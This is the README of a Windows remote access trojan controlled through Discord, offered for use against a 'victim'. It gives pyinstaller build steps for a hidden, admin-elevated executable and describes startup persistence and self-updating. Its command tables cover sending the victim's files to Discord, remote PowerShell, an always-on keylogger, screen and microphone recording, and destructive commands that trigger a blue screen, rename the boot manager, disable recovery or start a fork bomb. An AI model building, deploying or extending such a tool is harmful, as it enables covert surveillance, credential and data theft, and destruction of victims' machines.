# Zeos Discord RAT v2

A remote access trojan for Windows that is controlled through Discord. The
bot runs on the victim machine, opens a channel for itself and the owner
runs the commands in that channel.

## Useful Commands

### Install deps

```python
uv sync
```

### Install pyinstaller as dev dep

```python
uv add --dev pyinstaller
```

### Build the exe with the token of the .env file

```python
uv run python tools/builder.py
```

### Generate exe file

```python
uv run pyinstaller --clean --onefile --noconsole --paths src --collect-data certifi --add-binary "resources\libopus-0.x64.dll;discord/bin" --upx-dir resources --name "runtime" main.py
```

### Generate installer

```python
uv run pyinstaller --clean --onefile --console --uac-admin --collect-data certifi --paths src --name "installer" installer.py
```

### Encrypt the token of the bot

```python
uv run python tools/encrypt_token.py "<bot token>"
```

### Installation location

The runtime is installed in `C:\PythonRuntime` (`runtime.exe`) and is started
through a startup shortcut in the user's Startup folder. The uninstaller
removes that folder again.

### Updating the runtime

`!update_app` downloads the newest `runtime.exe` from the GitHub releases,
replaces the running one and starts it again.

## Commands

Every command uses the `!` prefix and only the owner of the bot may run
them. `!help` shows the full list inside Discord.

### Files

| Command | Description |
| --- | --- |
| `!pwd` | Show the current folder of the file browser. |
| `!ls` | List the content of the current folder. |
| `!cd <path>` | Change the folder of the file browser. |
| `!tree [depth]` | Show the structure of the current folder. |
| `!download <path>` | Send a file of the victim to Discord. |
| `!read <path>` | Show the content of a file as text. |
| `!push <path>` | Copy an attachment onto the victim, split files are joined. |
| `!execute <path>` | Run a file of the victim. |
| `!run_script <path> [url]` | Save a script and run it. |
| `!delete <path>` | Delete a file or a folder. |
| `!move <source> <target>` | Move a file or a folder. |
| `!clear` | Delete the messages that the runtime wrote. |
| `!upload [url]` | Download a file and send it to Discord. |

### The machine

| Command | Description |
| --- | --- |
| `!shell <command>` | Run a PowerShell command. |
| `!ps` | List the processes that are running. |
| `!show processes` | Show the processes that are running. |
| `!kill <name\|number>` | Kill a process by name or by the number of the listing. |
| `!foreground` | Show the process of the foreground window. |
| `!blacklist <name>` | Kill a process again as soon as it starts. |
| `!whitelist <name>` | Remove a process from the blacklist. |
| `!keys <text>` | Type on the machine, `ALTF4` and `ALTTAB` work too. |
| `!block-input` | Block the keyboard and the mouse. |
| `!unblock-input` | Unblock the keyboard and the mouse. |
| `!volume <0-100>` | Set the volume of the speakers. |
| `!monitors <on\|off>` | Turn the monitors of the machine on or off. |
| `!play <file>` | Play a wav, mp3 or midi file. |
| `!display [seconds]` | Show an attachment fullscreen on the machine. |
| `!glitch <effect> [seconds]` | Run a screen effect, `!glitch list` shows them. |
| `!screenrec [seconds]` | Record the screen into a video. |
| `!record [seconds]` | Record the microphone into a wav file. |
| `!join` / `!leave` | Stream the microphone into a voice channel. |
| `!wallpaper` | Set the wallpaper from an attachment. |
| `!clipboard [read\|write]` | Read or write the clipboard. |
| `!openurl <url>` | Open a URL in the browser. |
| `!block-website <url>` | Block a website with the hosts file. |
| `!unblock-website <url>` | Unblock a website of the hosts file. |

### Discord and the runtime

| Command | Description |
| --- | --- |
| `!screenshot` | Take a screenshot of the machine. |
| `!voice <text>` | Speak a text with the Windows voice. |
| `!join` / `!leave` | Stream the microphone into a voice channel. |
| `!keylog <start\|stop\|status>` | Write the typed keys into `key_log.txt`, the status sends the file. |
| `!popup <text>` | Show a Windows message box. |
| `!msgbox <options> "prompt"` | Show a Windows form with buttons. |
| `!inputbox <prompt>` | Show a Windows form with a text field. |
| `!replacer <action>` | Start, stop or check the text replacer. |
| `!replacements <rules>` | Manage the rules of the text replacer. |

The key logger runs from the moment the runtime starts. It writes the typed
characters into `key_log.txt` in the working directory, either when 2000
characters are collected or every 10 seconds, so the file is not written on
every key press. `!keylog status` sends that file to Discord.

### Destructive commands

| Command | Description |
| --- | --- |
| `!critical <set\|unset>` | Raise or lower the critical status of the runtime. |
| `!disable-reset` / `!enable-reset` | Change the Windows recovery environment. |
| `!break-windows` | Rename the boot manager of Windows. |
| `!bsod` | Trigger a blue screen of death. |
| `!forkbomb` | Start a fork bomb, the machine will freeze. |
| `!shutdown [seconds]` | Shut the machine down. |
| `!restart [seconds]` | Restart the machine. |
| `!restart_bot` | Restart the runtime itself. |
| `!exit` | Stop the runtime process. |
| `!update_app` | Update the runtime to the newest release. |
| `!implode` | Remove the runtime from the machine. |

## Differences to the reference implementation

The commands of the PySilon reference implementation were ported into the
structure of this project. Where both had the same feature, the better one
was kept and the command was renamed:

| Reference | Here | Why |
| --- | --- | --- |
| `.cmd <command>` | `!shell <command>` | PowerShell gives more output than the command prompt. |
| `.msg <parameters>` | `!popup`, `!msgbox`, `!inputbox` | The forms report which button was pressed. |
| `.tts <text>` | `!voice <text>` | The same feature with a shorter name. |
| `.upload <type> <name>` | `!push <path>` | The direction is now obvious, `!upload` still pulls a file into Discord. |
| `.download <file>` | `!download <path>` | The file goes straight to Discord instead of an external host. |
| `.remove <file>` | `!delete <path>` | The command asks for a confirmation first. |
| `.restart` | `!restart_bot` | `!restart` restarts the machine, like before. |
| `.monitors-off` / `.monitors-on` | `!monitors off` / `!monitors on` | One command with an argument. |
| `.display-graphic` | `!display` | Every image works, not only a custom file format. |
| `.upload multiple` | `!push` with several attachments | The chunks are joined without an extra tool. |
| `.kill <number>` | `!kill <name\|number>` | The process can also be killed by its name. |
| `.implode` | `!implode` | The scheduled task and the startup shortcut are removed as well. |

The reaction based confirmation of the reference implementation was replaced
by the `yes` and `no` answers that the delete command already used, because
reactions need a second message from the owner and break when the bot
cannot add them.

## State files
The runtime keeps its settings in `C:\PythonRuntime`:

| File | Description |
| --- | --- |
| `process_blacklist.json` | The processes that are killed again when they start. |
| `key_log.txt` | The characters that were typed on the machine. |
